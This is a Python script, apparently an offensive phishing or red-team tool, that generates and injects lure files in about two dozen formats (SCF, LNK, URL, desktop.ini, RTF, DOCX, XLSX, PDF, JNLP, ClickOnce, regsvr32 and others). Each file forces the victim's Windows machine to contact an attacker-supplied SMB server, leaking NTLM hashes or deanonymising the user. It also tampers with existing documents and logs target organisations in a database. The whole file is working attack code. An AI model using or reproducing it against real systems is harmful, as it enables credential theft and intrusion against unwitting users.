#!/usr/bin/env 
from __future__ import print_function

import argparse
import io
import os
import shutil
import xlsxwriter

import hashlib
import psycopg2
import zipfile
from bs4 import BeautifulSoup
from dotenv import load_dotenv
load_dotenv(".env")

SIGNATURE_PDF=0x255044462D
SIGNATURE_DOCX=0x504B0304

parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description='',
        usage='%(prog)s --server <ip_of_smb_catcher_server> --org_name <organization name>(require) --inject <filename>|--create <dir_name>(require)')

parser.add_argument('-s', '--server',action='store', dest='server',required=True,
    help='The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)')

parser.add_argument('-c', '--create',action='store', dest='filenames',required=False,
    help='The base filename without extension, can be renamed later (test, Board-Meeting2020, Bonus_Payment_Q4)')

parser.add_argument('-i', '--inject',action='store', dest='filename_inject',required=False,
    help='The base filename for inject')

parser.add_argument('-o', '--org_name',action='store', dest='org_name',required=True,
    help='The base org_name')

args = parser.parse_args()

def create_scf(server, md5_org_name, filename):
	
	file = open(filename,'w')
	file.write('''[Shell]
Command=2
IconFile=\\\\''' + server + f'''\\{md5_org_name}
[Taskbar]
Command=ToggleDesktop''')
	file.close()
	print("Created: " + filename + " (BROWSE TO FOLDER)")

# .url remote url attack
def create_url_url(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write('''[InternetShortcut]
URL=file://''' + server + f'''/{md5_org_name}''')
	file.close()
	print("Created: " + filename + " (BROWSE TO FOLDER)")


# .url remote IconFile attack
# Filename: shareattack.url, action=browse, attacks=explorer
def create_url_icon(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write('''[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\\\''' + server + f'''\\{md5_org_name}
IconIndex=1''')
	file.close()
	print("Created: " + filename + " (BROWSE TO FOLDER)")

# .rtf remote INCLUDEPICTURE attack
# Filename: shareattack.rtf, action=open, attacks=notepad/wordpad
def create_rtf(server, md5_org_name, filename):
	file = open(filename,'w')
    #file.write('''{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://''' + server + '''/test.jpg" \\\\* MERGEFORMAT\\\\d}}{\\fldrslt}}}''')
	file.write('''{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://''' + server + f'''/{md5_org_name}" ''' + ''' \\\\* MERGEFORMAT\\\\d}}{\\fldrslt}}}''')
	file.close()
	print("Created: " + filename + " (OPEN)")

# .xml remote stylesheet attack
# Filename: shareattack.xml, action=open, attacks=word
def create_xml(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write('''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<?mso-application progid="Word.Document"?>
<?xml-stylesheet type="text/xsl" href="\\\\''' + server + f'''\\{md5_org_name}" ?>''')
	file.close()
	print("Created: " + filename + " (OPEN)")

# .xml with remote includepicture field attack
# Filename: shareattack.xml, action=open, attacks=word
def create_xml_includepicture(server, md5_org_name, filename):
	documentfilename = os.path.join("templates", "includepicture-template.xml") 
	# Read the template file
	file = open(documentfilename, 'r', encoding="utf8")
	filedata = file.read()
	file.close()
	# Replace the target string
	filedata = filedata.replace('127.0.0.1', server)
	filedata = filedata.replace('bad.jpg', md5_org_name)
	# Write the file out again
	file = open(filename, 'w', encoding="utf8")
	file.write(filedata)
	file.close()
	print("Created: " + filename + " (OPEN)")

# .htm with remote image attack
# Filename: shareattack.htm, action=open, attacks=internet explorer + Edge + Chrome when launched from desktop
def create_htm(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write('''<!DOCTYPE html>
<html>
   <img src="file://''' + server + f'''/{md5_org_name}"/>
</html>''')
	file.close()
	print("Created: " + filename + " (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")

def create_html_https(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write('''<!DOCTYPE html>
<html>
   <img src="https://''' + server + f''':445/{md5_org_name}"/>
</html>''')
	file.close()
	print("Created: " + filename + " (OPEN localy for deanonimization)")


# .docx file with remote template attack
# Filename: shareattack.docx (unzip and put inside word\_rels\settings.xml.rels), action=open, attacks=word
# Instructions: Word > Create New Document > Choose a Template > Unzip docx, change target in word\_rels\settings.xml.rels change target to smb server
def create_docx_remote_template(server, md5_org_name, filename):
	# Source path  
	src = os.path.join("templates", "docx-remotetemplate-template") 
	# Destination path  
	dest = os.path.join("docx-remotetemplate-template")
	# Copy the content of  
	# source to destination  
	shutil.copytree(src, dest)  
	documentfilename = os.path.join("docx-remotetemplate-template", "word", "_rels", "settings.xml.rels")
	# Read the template file
	file = open(documentfilename, 'r')
	filedata = file.read()
	file.close()
	# Replace the target string
	filedata = filedata.replace('127.0.0.1', server)
	# Write the file out again
	file = open(documentfilename, 'w')
	file.write(filedata)
	file.close()
	shutil.make_archive(filename, 'zip', "docx-remotetemplate-template")
	os.rename(filename +".zip",filename)
	shutil.rmtree("docx-remotetemplate-template")
	print("Created: " + filename + " (OPEN)")

# .docx file with Frameset attack
def create_docx_frameset(server, md5_org_name, filename):
	# Source path  
	src = os.path.join("templates", "docx-frameset-template") 
	# Destination path  
	dest = os.path.join("docx-frameset-template")
	# Copy the content of  
	# source to destination  
	shutil.copytree(src, dest)  
	documentfilename = os.path.join("docx-frameset-template", "word", "_rels", "webSettings.xml.rels")
	# Read the template file
	file = open(documentfilename, 'r')
	filedata = file.read()
	file.close()
	# Replace the target string
	filedata = filedata.replace('127.0.0.1', server)
	filedata = filedata.replace('junkstr', md5_org_name)
	# Write the file out again
	file = open(documentfilename, 'w')
	file.write(filedata)
	file.close()
	shutil.make_archive(filename, 'zip', "docx-frameset-template")
	os.rename(filename +".zip",filename)
	shutil.rmtree("docx-frameset-template")

	print("Created: " + filename + " (OPEN)")

# .xlsx file with cell based attack
def create_xlsx_externalcell(server, md5_org_name, filename):
	workbook = xlsxwriter.Workbook(filename)
	worksheet = workbook.add_worksheet()
    #worksheet.write_url('AZ1', "external://"+server+"\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")
	worksheet.write_url('AZ1', "external://"+server+ f"\\{md5_org_name}'!$B$2:$C$62,2,FALSE)")
	workbook.close()
	print("Created: " + filename + " (OPEN)")

# .wax remote playlist attack
# Filename: shareattack.wax, action=open, attacks=windows media player
def create_wax(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write('''https://''' + server + f'''/{md5_org_name}
file://\\\\''' + server + f'''/{md5_org_name}''')
	file.close()
	print("Created: " + filename + " (OPEN)")

# .m3u remote playlist attack
# Filename: shareattack.m3u, action=open, attacks=windows media player
def create_m3u(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write('''#EXTM3U
#EXTINF:1337, Leak
\\\\''' + server + f'''\\{md5_org_name}''')
	file.close()
	print("Created: " + filename + " (OPEN IN WINDOWS MEDIA PLAYER ONLY)")

# .asx remote playlist attack
# Filename: shareattack.asx, action=open, attacks=windows media player
def create_asx(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write('''<asx version="3.0">
   <title>Leak</title>
   <entry>
      <title></title>
      <ref href="file://''' + server + f'''/{md5_org_name}"/>
   </entry>
</asx>''')
	file.close()
	print("Created: " + filename + " (OPEN)")

# .jnlp remote jar attack
# Filename: shareattack.jnlp, action=open, attacks=java web start
def create_jnlp(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write('''<?xml version="1.0" encoding="UTF-8"?>
<jnlp spec="1.0+" codebase="" href="">
   <resources>
      <jar href="file://''' + server + f'''/{md5_org_name}"/>
   </resources>
   <application-desc/>
</jnlp>''')
	file.close()
	print("Created: " + filename + " (OPEN)")

# .application remote dependency codebase attack
# Filename: shareattack.application, action=open, attacks= .NET ClickOnce
def create_application(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write('''<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />
   <description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
   <deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
   <dependency>
      <dependentAssembly dependencyType="install" codebase="file://''' + server + '''/leak/Leak.exe.manifest" size="32909">
         <assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
         <hash>
            <dsig:Transforms>
               <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
            </dsig:Transforms>
            <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
            <dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>
         </hash>
      </dependentAssembly>
   </dependency>
</asmv1:assembly>''')
	file.close()
	print("Created: " + filename + " (DOWNLOAD AND OPEN)")

# .pdf remote object? attack
# Filename: shareattack.pdf, action=open, attacks=Adobe Reader (Others?)
def create_pdf(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write('''%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R
   /AA <<
	   /O <<
	      /F (\\\\\\\\''' + server + f'''\\\\{md5_org_name})
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>
	   >>
	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj
4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj
trailer
<<
	/Root 1 0 R
>>
%%EOF''')
	file.close()
	print("Created: " + filename + " (OPEN AND ALLOW)")


def create_zoom(server,md5_org_name,filename):
	file = open(filename,'w')
	file.write('''To attack zoom, just put the following link along with your phishing message in the chat window:

\\\\''' + server + f'''\\{md5_org_name}
''')
	file.close()
	print("Created: " + filename + " (PASTE TO CHAT)")

def create_autoruninf(server,md5_org_name,filename):
	file = open(filename,'w')
	file.write('''[autorun]
open=\\\\''' + server + f'''\\{md5_org_name}
icon=something.ico
action=open Setup.exe''')
	file.close()
	print("Created: " + filename + " (BROWSE TO FOLDER)")

def create_desktopini(server, md5_org_name, filename):
	
	file = open(filename,'w')
	file.write('''[.ShellClassInfo]
IconResource=\\\\''' + server + f'''\\{md5_org_name}''')
	file.close()
	print("Created: " + filename + " (BROWSE TO FOLDER)")

# .lnk remote IconFile Attack
# Filename: shareattack.lnk, action=browse, attacks=explorer
def create_lnk(server, md5_org_name, filename):
	# these two numbers define location in template that holds icon location
	offset = 0x136
	max_path = 0xDF
	unc_path = f'\\\\{server}\\{md5_org_name}'
	if len(unc_path) >= max_path:
		print("Server name too long for lnk template, skipping.")
		return
	unc_path = unc_path.encode('utf-16le')
	with open(os.path.join("templates", "shortcut-template.lnk"), 'rb') as lnk:
		shortcut = list(lnk.read())
	for i in range(0, len(unc_path)):
		shortcut[offset + i] = unc_path[i]
	with open(filename,'wb') as file:
		file.write(bytes(shortcut))
	print("Created: " + filename + " (BROWSE TO FOLDER)")

def create_bat(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write('''echo 1 > //''' + server + f'''/{md5_org_name}''')
	file.close()
	print("Created: " + filename + " (OPEN)")

def create_ps1(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write('''echo 1 > //''' + server + f'''/{md5_org_name}''')
	file.close()
	print("Created: " + filename + " (OPEN via powershell)")

def create_wsf(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write(f'''<package>
  <job id="boom">
    <script language="VBScript">
       Set fso = CreateObject("Scripting.FileSystemObject")
       Set file = fso.OpenTextFile("//{server}/{md5_org_name}", 1)
    </script>
   </job>
</package>''')
	file.close()
	print("Created: " + filename + " (Open)")

def create_regsvr32(server, md5_org_name, filename):
	file = open(filename,'w')
	file.write('''regsvr32 /s /u /i://''' + server + f'''/{md5_org_name} scrobj.dll''')
	file.close()
	print("Created: " + filename + " (OPEN via cmd)")

def inject_docx(server, md5_org_name, filename):
    save_directory = "./tmp{}{}{}"
    websettings = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" \
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="\\\\{}\\{}" \
    TargetMode="External"/></Relationships>'''
    frameset = '''<w:frameset><w:framesetSplitbar><w:w w:val="60"/><w:color w:val="auto"/>\
    <w:noBorder/></w:framesetSplitbar><w:frameset><w:frame><w:name w:val="3"/>\
    <w:sourceFileName r:id="rId1"/><w:linkedToFile/></w:frame></w:frameset></w:frameset>'''

    shutil.rmtree(save_directory.format("", "", ""), ignore_errors=True)

    with zipfile.ZipFile(filename, 'r') as zip_file:
        zip_file.extractall(save_directory.format("", "", ""))
    
    ##########
    with open(save_directory.format("/word", "/webSettings.xml", ""), "r") as file:
        soup = file.read()

    xml_data = BeautifulSoup(soup, "xml")
    bs_websettings = xml_data.find("w:webSettings")
    frameset = BeautifulSoup(frameset, "html.parser")

    bs_websettings.append(frameset)
    row_websettings = str(xml_data)
    row_websettings = row_websettings.replace("framesetsplitbar", "framesetSplitbar")
    row_websettings = row_websettings.replace("noborder", "noBorder")
    row_websettings = row_websettings.replace("sourcefilename", "sourceFileName")
    row_websettings = row_websettings.replace("linkedtofile", "linkedToFile")
    with open(save_directory.format("/word", "/webSettings.xml", ""), "w") as file:
        file.write(row_websettings)

    ##########
    with open(save_directory.format("/word", "/_rels", "/webSettings.xml.rels"), "w+") as file:
        file.write(websettings.format(server, md5_org_name))
    ##########
    
    index = filename.find(".") 
    new_filename = filename[:index] + "_inject" + filename[index:]
    folder_path = save_directory.format("", "", "")
    with zipfile.ZipFile(new_filename, 'w') as zip_file:
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zip_file.write(file_path, arcname=os.path.relpath(file_path, folder_path))
    # uncomment
    #shutil.rmtree(save_directory.format("", "", ""), ignore_errors=True)
    print(f"File {new_filename} was injected")

def inject_pdf(server, md5_org_name, filename):
    payload = fr"/AA<</O<</F(\\\\{server}\\md5_org_name)/D[ 0 /Fit ] /S /GoToE>>>>"
    find_byte_str = b"/Type/Page/"
    with open(filename, "rb") as file:
        content = file.read()
    
    offset = content.find(find_byte_str)
    inject_content = content[:offset+len(find_byte_str)-1] + payload.encode(encoding="UTF-8") \
        + content[offset+len(find_byte_str)-1:]

    index = filename.find(".")
    new_filename = filename[:index] + "_inject" + filename[index:]
    with open(new_filename, "wb") as file:
        file.write(inject_content)
    
    print(f"File {new_filename} was injected")

def inject_exist_files(server_ip, md5_org_name, filename):
    """Заражение существующих файлов"""

    try:
        with open(filename, "rb") as file:
            signature = file.read(8)
    except FileNotFoundError as ex:
        print(f"File {filename} not found")
        return
    except Exception as ex:
        print(f"Error: {ex}")
        return

    if int.from_bytes(signature[:4],byteorder="big") == SIGNATURE_DOCX:
        inject_docx(server_ip, md5_org_name, filename)
    elif int.from_bytes(signature[:5],byteorder="big") == SIGNATURE_PDF:
        inject_pdf(server_ip, md5_org_name, filename)
    else:
        print("Unknown format of file!")
        return

def create_injected_files(server_ip, md5_org_name, filename):
    """Создание зараженных файлов"""

    # create folder to hold templates, if already exists delete it
    if os.path.exists(filename):
    	shutil.rmtree(filename)
    os.makedirs(filename)
    
    # handle which documents to create
    create_scf(server_ip, md5_org_name, os.path.join(filename, filename + ".scf"))

    create_rtf(server_ip, md5_org_name, os.path.join(filename, filename + ".rtf"))

    create_url_url(server_ip, md5_org_name, os.path.join(filename, filename + "-(url).url"))

    create_url_icon(server_ip, md5_org_name, os.path.join(filename, filename + "-(icon).url"))

    create_m3u(server_ip, md5_org_name, os.path.join(filename, filename + ".m3u"))

    create_wax(server_ip, md5_org_name, os.path.join(filename, filename + ".wax"))

    create_asx(server_ip, md5_org_name, os.path.join(filename, filename + ".asx"))

    create_htm(server_ip, md5_org_name, os.path.join(filename, filename + ".htm"))

    create_xml(server_ip, md5_org_name, os.path.join(filename, filename + "-(stylesheet).xml"))

    create_xml_includepicture(server_ip, md5_org_name, os.path.join(filename, filename + "-(fulldocx).xml"))

    create_xlsx_externalcell(server_ip, md5_org_name, os.path.join(filename, filename + "-(externalcell).xlsx"))

    # not working
    #create_docx_remote_template(server_ip, md5_org_name, os.path.join(filename, filename + "-(remotetemplate).docx"))

    create_docx_frameset(server_ip, md5_org_name, os.path.join(filename, filename + "-(frameset).docx"))

    create_jnlp(server_ip, md5_org_name, os.path.join(filename, filename + ".jnlp"))

    create_application(server_ip, md5_org_name, os.path.join(filename, filename + ".application"))

    create_desktopini(server_ip, md5_org_name, os.path.join(filename, "desktop.ini"))

    create_lnk(server_ip, md5_org_name, os.path.join(filename, filename + ".lnk"))

    create_autoruninf(server_ip, md5_org_name, os.path.join(filename, "Autorun.inf"))

    create_zoom(server_ip, md5_org_name, os.path.join(filename, "zoom-attack-instructions.txt"))

    create_pdf(server_ip, md5_org_name, os.path.join(filename, filename + ".pdf"))

    create_bat(server_ip, md5_org_name, os.path.join(filename, filename + ".bat"))

    create_wsf(server_ip, md5_org_name, os.path.join(filename, filename + ".wsf"))

    create_ps1(server_ip, md5_org_name, os.path.join(filename, filename + ".ps1"))

    create_regsvr32(server_ip, md5_org_name, os.path.join(filename, filename + ".sct"))

    print("Генерация файлов завершена.")

def create_injected_deanon_files(server_ip, md5_org_name, filename): 
    """Добавление внешних ссылок в документы"""

    create_html_https(server_ip, md5_org_name, os.path.join(filename, filename + ".deanon.html"))
    print("Генерация файлов для деанонимизации завершена.")

def add_org_name_in_db(org_name, md5_org_name):
    """Добавление названия организации в базу данных"""

    try:
        conn = psycopg2.connect(dbname=os.environ["DB_NAME"], user=os.environ["DB_LOGIN"], password=os.environ["DB_PASSWORD"], host=os.environ["DB_HOST"], port=os.environ["DB_PORT"])
        cursor = conn.cursor()
        query = (org_name, md5_org_name)
        cursor.execute("INSERT INTO orgs (org_name, md5_org_name) VALUES (%s, %s) ON CONFLICT DO NOTHING", query)
        conn.commit()
    except Exception as exc:
        print(str(exc))
        conn.rollback()
    finally:
        cursor.close()
        conn.close()

def main():

    md5_org_name = hashlib.md5(str.encode(args.org_name)).hexdigest()
    if args.filename_inject:
        inject_exist_files(args.server, md5_org_name, args.filename_inject)
    elif args.filenames:
        #create_injected_files(args.server, md5_org_name, args.filenames)
        create_injected_deanon_files(args.server, md5_org_name, args.filenames)
    else:
        print("Needed necessary keys: --inject or --create")
        return

    add_org_name_in_db(args.org_name, md5_org_name)

if __name__ == "__main__":
    main()
